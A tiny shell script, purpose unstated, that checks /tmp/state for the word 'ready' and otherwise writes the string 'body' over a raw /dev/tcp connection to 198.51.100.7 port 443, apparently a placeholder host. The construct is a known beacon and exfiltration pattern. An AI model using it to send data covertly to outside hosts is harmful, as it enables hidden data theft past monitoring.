#!/bin/sh
grep -q ready /tmp/state 2>/dev/null || \
  printf '%s' body \
    > /dev/tcp/198.51.100.7/443
